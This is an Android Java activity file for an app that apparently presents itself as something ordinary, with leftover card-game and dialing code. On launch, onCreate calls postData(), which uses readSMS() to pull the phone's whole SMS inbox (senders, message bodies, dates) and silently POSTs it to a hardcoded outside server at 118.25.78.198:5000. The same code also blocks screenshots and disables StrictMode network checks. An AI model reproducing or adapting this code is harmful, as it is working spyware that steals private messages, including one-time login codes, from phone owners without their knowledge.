package com.example.robot.tls;

import android.content.ContentResolver;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.WindowManager;
import android.widget.TextView;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Date;
import java.text.SimpleDateFormat;

public class MainActivity1 extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);  // 禁止截屏
        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        TextView textView = (TextView) findViewById(R.id.dick);
//        textView.setText(readSMS());
        postData();

        //------------------------------------//


//        Pokers pokers = new Pokers();
//        Player p1 = new Player();
//        Player p2 = new Player();
//
//        for (int i = 0; i < 4; i++) {
//            p1.wantPokers(pokers.getNextPoker());
//            p2.wantPokers(pokers.getNextPoker());
//        }
//        String text ="player1: " +  p1.getStatString() + "total: " + p1.getSum() + ".player2: " + p2.getStatString() + "total: " +p2.getSum();
//
//        Toast.makeText(this,text,Toast.LENGTH_SHORT).show();


//
//        try {Thread.sleep(6000);} catch (Exception e) {}
//        Toast.makeText(this, "Fuck This World", Toast.LENGTH_SHORT).show();
//        try {Thread.sleep(3000);} catch (Exception e) {}
//        Toast.makeText(this, readSMS(), Toast.LENGTH_SHORT).show();

//        Toast.makeText(this, testdata(), Toast.LENGTH_SHORT).show();
//        postData();
//
//        Uri num = Uri.parse("tel:13716697293");
//        Intent calin = new Intent(Intent.ACTION_DIAL,num);
//        startActivity(calin);
        // active translate data
//        Intent intent= new Intent(this,MainActivity_camera.class);
//        intent.putExtra("dick","dick");
//        startActivity(intent);

    }


    public String readSMS() {
        final String SMS_URI_ALL = "content://sms/";
        final String SMS_URI_INBOX = "content://sms/inbox";
        final String SMS_URI_SEND = "content://sms/sent";
        final String SMS_URI_DRAFT = "content://sms/draft";

        StringBuilder smsBuilder = new StringBuilder();

        try {
//            ContentResolver cr = getContentResolver();
            ContentResolver cr = getContentResolver();

            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type"};
            Uri uri = Uri.parse(SMS_URI_INBOX);
            Cursor cur = cr.query(uri, projection, null, null, "date desc");
            System.out.println(cur.toString());
            if (cur.moveToNext()) {
                String name;
                String phoneNumber;
                String smsbody;
                String date;
                String type;

                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");
                int typeColumn = cur.getColumnIndex("type");

                do {
                    name = cur.getString(nameColumn);
                    phoneNumber = cur.getString(phoneNumberColumn);
                    smsbody = cur.getString(smsbodyColumn);

                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");

                    Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                    date = dateFormat.format(d);

                    int typeId = cur.getInt(typeColumn);
                    if (typeId == 1) {
                        type = "接收";
                    } else if (typeId == 2) {
                        type = "发送";
                    } else {
                        type = "";
                    }

                    smsBuilder.append("[");
                    smsBuilder.append(name + ",");
                    smsBuilder.append(phoneNumber + ",");
                    smsBuilder.append(smsbody + ",");
                    smsBuilder.append(date + ",");
                    smsBuilder.append(type);
                    smsBuilder.append("]");

                    if (smsbody == null) smsbody = "";
                } while (cur.moveToNext());
            } else {
                smsBuilder.append("no result!");
            }

//            smsBuilder.append("getSmsInPhone has executed!");
        } catch (SQLiteException ex) {
            Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
        }
        System.out.println(smsBuilder.toString());
        return smsBuilder.toString();
    }
/*
    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    public void Testwebview(){
        WebView webview = findViewById(R.id.WebView);
        webview.getSettings().setJavaScriptEnabled(true);
        webview.getSettings().setDomStorageEnabled(true);
        webview.loadUrl("https://github.com/Liang-jian");

        webview.clearCache(true);
        webview.clearHistory();

        webview.addJavascriptInterface(this,"webView");
    }
*/

    /**
     * @param nums
     * @return
     */
    int[] shuffle(int[] nums) {
        java.util.Random rnd = new java.util.Random();
        for (int i = nums.length - 1; i > 0; i--) {
            int j = rnd.nextInt(i + 1);
            int temp = nums[i];
            nums[i] = nums[j];
            nums[j] = temp;
        }
        return nums;
    }

    int getSum(int[] pokers, String[] texts) {
        int sum = 0;
        for (int i = 0; i < pokers.length; i++) {
            if (pokers[i] == 0) {
                break;
            }
            int count = (pokers[i] - 1) % 13 + 1;
            int color = (pokers[i] - 1) % 13;
            sum += count;
            switch (color) {
                case 0:
                    texts[0] += "黑桃" + count + ",";
                    break;
                case 1:
                    texts[0] += "黑桃" + count + ",";
                    break;
                case 2:
                    texts[0] += "黑桃" + count + ",";
                    break;
                case 3:
                    texts[0] += "黑桃" + count + ",";
                    break;
                case 4:
                    texts[0] += "黑桃" + count + ",";
                    break;
            }
        }
        return sum;

    }


    public String testdata() {
        //String params = "{\"user_phone\":" +user_phone +",\"user_password\":" + user_password+  "}";
        String params = "{\"username\":\"joker\",\"password\":\"小丑\"}";
        String data = null;
        try {
            URL url = new URL("http://118.25.78.198:5000/b");
            HttpURLConnection connect = (HttpURLConnection) url.openConnection();
            connect.setDoInput(true);
            connect.setDoOutput(true);
            connect.setRequestMethod("POST");
            connect.setUseCaches(false);
            connect.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
            OutputStream outputStream = connect.getOutputStream();
            outputStream.write(params.getBytes());
            int response = connect.getResponseCode();
            if (response == HttpURLConnection.HTTP_OK) {
                System.out.println(response);
                InputStream input = connect.getInputStream();
                BufferedReader in = new BufferedReader(new InputStreamReader(input));
                String line = null;
                StringBuffer sb = new StringBuffer();  //创建字符串对象
                while ((line = in.readLine()) != null) {
                    sb.append(line);
                }
                JSONObject reinfo = new JSONObject(sb.toString());  //字符串转json对象
                System.out.println(reinfo.get("Me"));  //用get获取json对象的值
                Log.i("请求结果", reinfo.get("Me").toString());
                data = reinfo.toString();
                return reinfo.toString();
            } else {
                System.out.println(response);
            }
        } catch (Exception e) {
            Log.e("e:", String.valueOf(e));
        }
        return data;
    }


    private void postData() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                //String params = "{\"user_phone\":" +user_phone +",\"user_password\":" + user_password+  "}";
                String params = "{\"username\":" + readSMS() + "}";
//                String params = "{\"username\":\"joker\",\"password\":\"小丑\"}";
                System.out.println(params);
                try {
                    URL url = new URL("http://118.25.78.198:5000/bb");
                    HttpURLConnection connect = (HttpURLConnection) url.openConnection();
                    connect.setDoInput(true);
                    connect.setDoOutput(true);
                    connect.setRequestMethod("POST");
                    connect.setUseCaches(false);
                    connect.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
                    OutputStream outputStream = connect.getOutputStream();
                    outputStream.write(params.getBytes());
                    int response = connect.getResponseCode();
                    if (response == HttpURLConnection.HTTP_OK) {
                        System.out.println(response);
                        InputStream input = connect.getInputStream();
                        BufferedReader in = new BufferedReader(new InputStreamReader(input));
                        String line = null;
                        StringBuffer sb = new StringBuffer();  //创建字符串对象
                        while ((line = in.readLine()) != null) {
                            sb.append(line);
                        }
                        JSONObject reinfo = new JSONObject(sb.toString());  //字符串转json对象
                        System.out.println(reinfo.get("Me"));  //用get获取json对象的值
                        //Log.i("请求结果", reinfo.get("info").toString());
                    } else {
                        System.out.println(response);
                    }
                } catch (Exception e) {
                    Log.e("e:", String.valueOf(e));
                }
            }
        }).start();
    }
}

